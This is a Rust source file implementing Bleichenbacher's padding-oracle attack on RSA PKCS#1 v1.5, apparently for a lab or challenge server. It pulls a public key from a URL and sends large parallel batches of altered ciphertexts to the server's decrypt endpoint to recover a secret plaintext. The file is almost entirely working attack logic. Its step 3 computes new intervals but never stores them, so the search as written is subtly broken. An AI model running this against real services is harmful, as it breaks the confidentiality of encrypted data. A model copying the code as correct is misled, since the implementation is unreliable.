#![allow(non_snake_case)]

use indicatif::{MultiProgress, ProgressBar, ProgressStyle};
use num_bigint::BigUint;
use num_traits::{One, Zero};
use rayon::iter::{IntoParallelRefIterator, ParallelIterator};
use reqwest::blocking::Client;
use serde_json::Value;
use std::{
    sync::{atomic::AtomicU64, Arc},
    time::Duration,
};

use crate::utils::{CustomError, DecryptRes, PublicKeyInfo};

const BATCH_SIZE: usize = 256;

#[derive(Debug)]
pub struct Oracle {
    pub client: Client,
    pub url: String,
}

impl Oracle {
    pub fn new(url: &str) -> Self {
        let client = Client::new();
        Self {
            client,
            url: String::from(url),
        }
    }

    pub fn is_pkcs1_compliant(&self, cipher: &BigUint, k: usize) -> Result<bool, CustomError> {
        let cipher_bytes = to_k_bytes_be(cipher, k);
        let res: DecryptRes = self
            .client
            .get(format!(
                "{}/decrypt?c={}",
                self.url,
                hex::encode(&cipher_bytes)
            ))
            .send()?
            .json()?;
        Ok(res.is_valid())
    }
}

#[derive(Debug)]
pub struct Attacker {
    pub oracle: Oracle,
    pub state: AttackState,
}

impl Attacker {
    pub fn new(url: &str, cipher: &[u8]) -> Result<Self, CustomError> {
        let client = Client::new();
        let json = client.get(url.to_string()).send()?.text()?;
        let v: Value = serde_json::from_str(&json)?;
        let public_json = &v["public"];

        let rsa_pubkey: PublicKeyInfo = serde_json::from_value(public_json.clone())?;

        let state = AttackState::new(rsa_pubkey, cipher);
        let oracle = Oracle::new(url);

        Ok(Self { oracle, state })
    }

    #[allow(clippy::too_many_arguments)]
    fn find_s_parallel(
        &self,
        c: &BigUint,
        e: &BigUint,
        n: &BigUint,
        k: usize,
        mut start: BigUint,
        batch_size: usize,
    ) -> Result<BigUint, CustomError> {
        let num_workers = rayon::current_num_threads();

        let mp = MultiProgress::new();
        let mut bars_vec = Vec::with_capacity(num_workers);

        for i in 0..num_workers {
            let pb = mp.add(ProgressBar::new_spinner());
            let style =
                ProgressStyle::with_template("{spinner:.green} worker {prefix}: {msg}").unwrap();
            pb.set_style(style);
            pb.set_prefix(format!("{}", i));
            pb.enable_steady_tick(Duration::from_millis(100));
            bars_vec.push(pb);
        }

        let bars = Arc::new(bars_vec);

        let probe_counters: Vec<AtomicU64> = (0..num_workers).map(|_| AtomicU64::new(0)).collect();
        let probe_counters = Arc::new(probe_counters);

        const UPDATE: u64 = 50;

        let client = Arc::new(self.oracle.client.clone());
        let url = Arc::new(self.oracle.url.clone());

        let probe = |cprime: BigUint| -> bool {
            let cipher_bytes = to_k_bytes_be(&cprime, k);
            match client
                .get(format!("{}/decrypt?c={}", url, hex::encode(&cipher_bytes)))
                .send()
            {
                Ok(resp) => match resp.json::<DecryptRes>() {
                    Ok(decrypt_res) => decrypt_res.is_valid(),
                    Err(e) => {
                        eprintln!("Error parsing JSON response: {}", e);
                        false
                    }
                },
                Err(e) => {
                    eprintln!("HTTP request error: {}", e);
                    false
                }
            }
        };

        loop {
            let candidates: Vec<BigUint> = (0..batch_size)
                .map(|i| &start + BigUint::from(i as u32))
                .collect();

            let successes: Vec<BigUint> = candidates
                .par_iter()
                .filter_map(|s_candidate| {
                    let se = s_candidate.modpow(e, n);
                    let cprime = (c * &se) % n;

                    let worker_id = rayon::current_thread_index().unwrap_or(0);
                    let pb = &bars[worker_id];
                    let counter = &probe_counters[worker_id];

                    let prev = counter.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
                    if prev.is_multiple_of(UPDATE) {
                        pb.set_message(format!("testing s={} | probes={}", s_candidate, prev + 1));
                    }

                    if probe(cprime) {
                        pb.set_message(format!(
                            "found s={} after probes={}",
                            s_candidate,
                            prev + 1
                        ));
                        Some(s_candidate.clone())
                    } else {
                        None
                    }
                })
                .collect();

            if !successes.is_empty() {
                let min_s = successes.into_iter().min().unwrap();

                for pb in bars.iter() {
                    pb.finish_and_clear();
                }

                return Ok(min_s);
            }

            start += BigUint::from(batch_size as u32);
        }
    }

    pub fn attack(&mut self) -> Result<BigUint, CustomError> {
        // step1 can be skipped since `c` is already a valid PKCS#1 v1.5 ciphertext, but check
        // anyway
        if !self
            .oracle
            .is_pkcs1_compliant(&self.state.c, self.state.k)?
        {
            return Err(CustomError::Other(
                "Initial ciphertext is not PKCS#1 v1.5 compliant".to_string(),
            ));
        }

        let pb = self.progress_bar();

        // easier access to state variables
        let n = self.state.n.clone();
        let e = self.state.e.clone();
        let B = self.state.B.clone();
        let k = self.state.k;

        let c = self.state.c.clone();

        let B2 = 2u8 * &B;
        let B3 = 3u8 * &B;

        let mut prev_s = BigUint::one();

        let mut oracle_queries = 0u64;

        let mut m_found = false;
        while !m_found {
            let mut s_i = if self.state.it == 1 {
                ceiling_div(&n, &B3)
            } else {
                &prev_s + BigUint::one()
            };

            if self.state.it == 1 || self.state.M.len() >= 2 {
                // parallel step2a / 2b
                s_i = self.find_s_parallel(&c, &e, &n, k, s_i.clone(), BATCH_SIZE)?;
            } else {
                // just one interval in M
                // step 2c
                let (a, b) = &self.state.M[0];

                let mut r_i = ceiling_div(&(2u8 * (b * &prev_s - &B2)), &n);
                s_i = ceiling_div(&(&B2 + &r_i * &n), b);

                let mut se = s_i.modpow(&e, &n);

                while !self.oracle.is_pkcs1_compliant(&((&c * &se) % &n), k)? {
                    oracle_queries += 1;

                    pb.set_message(format!(
                        "iter={} | intervals={} | s={} | step={} | oracle_queries={}",
                        self.state.it,
                        self.state.M.len(),
                        s_i,
                        "2c",
                        oracle_queries
                    ));

                    if s_i > ceiling_div(&(&B3 + &r_i * &n), a) {
                        r_i += 1u8;
                        s_i = ceiling_div(&(&B2 + &r_i * &n), b);
                    } else {
                        s_i += 1u8;
                    }
                    se = s_i.modpow(&e, &n);
                }
            }

            // step 3
            let mut new_M = Vec::<Interval>::new();
            for (a, b) in &self.state.M {
                let mut r = ceiling_div(&(a * &s_i - &B3 + 1u8), &n);
                let r_upper = (b * &s_i - &B2) / &n;

                while r <= r_upper {
                    let lower_bound = std::cmp::max(a.clone(), ceiling_div(&(&B2 + &r * &n), &s_i));

                    let upper_bound = std::cmp::min(b.clone(), &(&B3 - 1u8 + &r * &n) / &s_i);

                    pb.set_message(format!(
                        "iter={} | intervals={} | s={} | r={} | step={} | oracle_queries={}",
                        self.state.it,
                        self.state.M.len(),
                        s_i,
                        r,
                        "3",
                        oracle_queries
                    ));

                    let interval = (lower_bound, upper_bound);

                    if B2 <= interval.0 && interval.0 <= interval.1 && interval.1 < B3 {
                        new_M.push(interval);
                    }

                    r += 1u8;
                }
            }

            // merge M intervals
            self.state.combine_intervals();

            // loop operations
            prev_s = s_i;
            self.state.it += 1;

            if self.state.M.len() == 1 && self.state.M[0].0 == self.state.M[0].1 {
                m_found = true;
            }
        }

        pb.finish_with_message(format!(
            "done: iterations={} oracle_queries={}",
            self.state.it, oracle_queries
        ));

        let (m, _) = &self.state.M[0]; // only one interval left

        Ok(m.clone())
    }

    fn progress_bar(&self) -> ProgressBar {
        let pb = ProgressBar::new_spinner();
        pb.set_style(
            ProgressStyle::with_template("[{elapsed_precise}] {spinner:.green} {msg}").unwrap(),
        );
        pb.enable_steady_tick(Duration::from_millis(100));
        pb.set_message("starting attack...".to_string());
        pb
    }
}

pub fn to_k_bytes_be(x: &num_bigint::BigUint, k: usize) -> Vec<u8> {
    let mut x_bytes = x.to_bytes_be();
    while x_bytes.len() < k {
        x_bytes.insert(0, 0u8);
    }
    x_bytes
}

pub fn ceiling_div(num: &BigUint, den: &BigUint) -> BigUint {
    let quot = num / den;
    let rem = num % den;
    if rem.is_zero() {
        quot
    } else {
        quot + 1u8
    }
}

type Interval = (BigUint, BigUint);

#[derive(Debug)]
pub struct AttackState {
    pub k: usize,
    pub n: BigUint,
    pub B: BigUint,
    pub c: BigUint,
    pub M: Vec<Interval>,
    pub e: BigUint,

    pub it: u64,
}

impl AttackState {
    pub fn new(rsa_pubkey: PublicKeyInfo, c: &[u8]) -> Self {
        let decoded = hex::decode(&rsa_pubkey.public_modulus_hex).expect("Invalid hex in modulus");
        let k = decoded.len();
        let n = BigUint::from_bytes_be(&decoded);
        let e = BigUint::from(rsa_pubkey.public_exponent_dec);

        // B = 2^(8*(k-2))
        let B = {
            let exp: u32 = (8 * (k - 2)) as u32;
            let base: BigUint = 2u8.into();
            base.pow(exp)
        };
        let c = BigUint::from_bytes_be(c);

        // Initial interval: [2B, 3B - 1]
        let M = vec![(2u8 * &B, 3u8 * &B - 1u8)];

        Self {
            k,
            n,
            B,
            c,
            M,
            e,
            it: 1u64,
        }
    }

    pub fn combine_intervals(&mut self) {
        self.M.sort();

        let mut combined = vec![];
        for interval_a in self.M.iter() {
            let mut found = false;

            for interval_b in combined.iter_mut() {
                if overlap(interval_a, interval_b) {
                    interval_b.0 = ((&(interval_b.0)).min(&interval_a.0)).clone();
                    interval_b.1 = ((&(interval_b.1)).max(&interval_a.1)).clone();
                    found = true;
                    break;
                }
            }

            if !found {
                combined.push(interval_a.clone());
            }
        }

        self.M = combined;
    }
}

pub fn overlap(x: &Interval, y: &Interval) -> bool {
    x.0 <= y.1 && y.0 <= x.1
}
